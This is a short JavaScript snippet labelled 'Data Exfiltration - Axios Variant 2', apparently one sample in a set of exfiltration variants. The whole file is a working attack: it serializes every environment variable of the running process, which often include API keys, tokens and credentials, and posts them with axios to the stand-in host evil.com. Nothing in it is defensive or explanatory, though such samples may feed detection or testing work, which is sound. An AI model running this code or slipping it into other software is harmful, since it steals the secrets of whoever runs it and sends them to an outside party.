// Data Exfiltration - Axios Variant 2
const fs = require('fs');
const axios = require('axios');
const env = JSON.stringify(process.env);
axios.post('http://evil.com/env', { env });
